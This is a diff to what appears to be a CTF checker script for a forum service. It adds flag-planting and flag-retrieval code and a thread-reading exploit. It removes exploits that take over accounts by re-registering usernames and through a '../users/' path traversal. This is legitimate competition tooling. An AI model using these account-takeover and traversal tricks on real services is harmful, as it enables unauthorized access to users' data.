@@ -6,6 +6,7 @@ import string
 import jwt
 import httpx
 from python_socks.async_.asyncio import Proxy
+from python_socks import ProxyConnectionError
 
 from typing import Optional
 from logging import LoggerAdapter
@@ -70,6 +71,55 @@ class Connection:
             res = await self.client.post("/license.php", data={"key": key})
             self._verify_302_with_redirect(res, "/license.php?success", "Licensing failed")
 
+class ForumConnection:
+    def __init__(self, host:str, username: str, password:str, service: str):
+        self.proxy = Proxy.from_url(f"socks5://{username}:{password}@{host}:1080", rdns=True)
+        self.service = service
+        self.rd = None
+        self.wr = None
+
+    async def connect(self):
+        try:
+            sock = await self.proxy.connect(self.service, 1337)
+        except ProxyConnectionError:
+            raise OfflineException("Could not connect to proxy")
+        self.rd, self.wr = await asyncio.open_connection(
+            host=None,
+            port=None,
+            sock=sock,
+        )
+        await self.rd.readuntil(b"\n>")
+
+    def verify_connected(self):
+        if self.rd == None or self.wr == None:
+            raise Exception("not connected")
+
+    async def join(self, thread_id: str):
+        self.verify_connected()
+        self.wr.write(f"join {thread_id}\n".encode())
+        await self.wr.drain()
+        res = await self.rd.readuntil(b"\n>")
+        assert_in(f"changed thread to {thread_id}", res.decode(encoding='utf-8'), f"{self.service} forum non-functional")
+
+    async def post(self, content: str):
+        self.verify_connected()
+        self.wr.write(f"post {content}\n".encode())
+        await self.wr.drain()
+        await self.rd.readuntil(b"\n>")
+
+    async def list_threads(self):
+        self.verify_connected()
+        self.wr.write(f"list\n".encode())
+        await self.wr.drain()
+        return await self.rd.readuntil(b"\n>")
+
+    async def show(self):
+        self.verify_connected()
+        self.wr.write(f"show\n".encode())
+        await self.wr.drain()
+        return await self.rd.readuntil(b"\n>")
+
+
 
 @checker.register_dependency
 def _get_connection(client: httpx.AsyncClient, logger: LoggerAdapter) -> Connection:
@@ -101,57 +151,39 @@ async def putflag_premiumkv(
     # Register a new user
     await conn.register_user(username, password, True)
 
-    proxy = Proxy.from_url(f"socks5://{username}:{password}@{task.address}", rdns=True)
-    sock = await proxy.connect('premium-forum', 1337)
-    rd, wr = await asyncio.open_connection(
-        host=None,
-        port=None,
-        sock=sock,
-    )
+    forum = ForumConnection(host, username, password, 'premium-forum')
+    await forum.connect()
 
-    await rd.readuntil(b"\n>")
-    wr.write(f"join {thread_id}".encode())
-    await wr.drain()
-    res = await rd.readuntil(b"\n>")
-    assert_in("changed thread to", res, "Premium Forum non-functional")
+    logger.info(f"joining thread {thread_id}")
+    await forum.join(thread_id)
 
-    # TODO: finish this
+    logger.info("posting flag")
+    await forum.post(task.flag)
 
     # Save the generated values for the associated getflag() call.
     await db.set("userdata", (username, password, thread_id))
 
-    return username
+    return thread_id #{"username": username, "thread_id": thread_id}
 
-"""
 @checker.getflag(0)
 async def getflag_premiumkv(
     task: GetflagCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection
 ) -> None:
     try:
-        username, password, noteId = await db.get("userdata")
+        username, password, thread_id = await db.get("userdata")
     except KeyError:
         raise MumbleException("Missing database entry from putflag")
 
-    logger.debug(f"Connecting to the service")
-    await conn.reader.readuntil(b">")
+    logger.info('connecting to premium-forum')
+    forum = ForumConnection(task.address, username, password, 'premium-forum')
+    await forum.connect()
 
-    # Let's login to the service
-    await conn.login_user(username, password)
+    logger.info(f"joining thread {thread_id}")
+    await forum.join(thread_id)
 
-    # Let´s obtain our note.
-    logger.debug(f"Sending command to retrieve note: {noteId}")
-    conn.writer.write(f"get {noteId}\n".encode())
-    await conn.writer.drain()
-    note = await conn.reader.readuntil(b">")
-    assert_in(
-        task.flag.encode(), note, "Resulting flag was found to be incorrect"
-    )
-
-    # Exit!
-    logger.debug(f"Sending exit command")
-    conn.writer.write(f"exit\n".encode())
-    await conn.writer.drain()
-"""
+    logger.info('getting thread')
+    res = await forum.show()
+    assert_in(task.flag, res.decode('utf-8'), "flag not found in thread")
         
 @checker.putnoise(0)
 async def putnoise0(task: PutnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection):
@@ -173,9 +205,10 @@ async def putnoise0(task: PutnoiseCheckerTaskMessage, db: ChainDB, logger: Logge
 
     await db.set("userdata", (username, password))
 
-"""
 @checker.getnoise(0)
 async def getnoise0(task: GetnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection):
+    # TODO: implement
+    return
     try:
         (username, password, noteId, randomNote) = await db.get('userdata')
     except:
@@ -200,7 +233,7 @@ async def getnoise0(task: GetnoiseCheckerTaskMessage, db: ChainDB, logger: Logge
     conn.writer.write(f"exit\n".encode())
     await conn.writer.drain()
 
-
+"""
 @checker.havoc(0)
 async def havoc0(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
     logger.debug(f"Connecting to service")
@@ -297,65 +330,30 @@ async def havoc2(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Con
     data = await conn.reader.readuntil(b">")
     if not noteId.encode() in data:
         raise MumbleException("List command does not work as intended")
+"""
 
 @checker.exploit(0)
 async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger:LoggerAdapter) -> Optional[str]:
-    welcome = await conn.reader.readuntil(b">")
-    conn.writer.write(b"dump\nexit\n")
-    await conn.writer.drain()
-    data = await conn.reader.read(-1)
+
+    username: str = "".join(
+        random.choices(string.ascii_uppercase + string.digits, k=12)
+    )
+    password: str = "".join(
+        random.choices(string.ascii_uppercase + string.digits, k=12)
+    )
+    await conn.register_user(username, password)
+
+    forum = ForumConnection(task.address, username, password, 'premium-forum')
+    
+    await forum.connect()
+
+    await forum.join(task.attack_info)
+
+    data = await forum.show()
     if flag := searcher.search_flag(data):
         return flag
     raise MumbleException("flag not found")
 
-@checker.exploit(1)
-async def exploit1(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger:LoggerAdapter) -> Optional[str]:
-    welcome = await conn.reader.readuntil(b">")
-    conn.writer.write(b"user\n")
-    await conn.writer.drain()
-
-    # TODO: Use flag hints
-    user_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
-    for user in user_list:
-        user_name = user.split()[-1]
-        conn.writer.write(b"reg %s foo\nlog %s foo\n list\n" % (user_name, user_name))
-        await conn.writer.drain()
-        await conn.reader.readuntil(b">")  # successfully registered
-        await conn.reader.readuntil(b">")  # successfully logged in
-        notes_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
-        for note in notes_list:
-            note_id = note.split()[-1]
-            conn.writer.write(b"get %s\n" % note_id)
-            await conn.writer.drain()
-            data = await conn.reader.readuntil(b">")
-            if flag := searcher.search_flag(data):
-                return flag
-    raise MumbleException("flag not found")
-
-@checker.exploit(2)
-async def exploit2(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger:LoggerAdapter) -> Optional[str]:
-    welcome = await conn.reader.readuntil(b">")
-    conn.writer.write(b"user\n")
-    await conn.writer.drain()
-
-    # TODO: Use flag hints?
-    user_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
-    for user in user_list:
-        user_name = user.split()[-1]
-        conn.writer.write(b"reg ../users/%s foo\nlog %s foo\n list\n" % (user_name, user_name))
-        await conn.writer.drain()
-        await conn.reader.readuntil(b">")  # successfully registered
-        await conn.reader.readuntil(b">")  # successfully logged in
-        notes_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
-        for note in notes_list:
-            note_id = note.split()[-1]
-            conn.writer.write(b"get %s\n" % note_id)
-            await conn.writer.drain()
-            data = await conn.reader.readuntil(b">")
-            if flag := searcher.search_flag(data):
-                return flag
-    raise MumbleException("flag not found")
-"""
 
 
 if __name__ == "__main__":
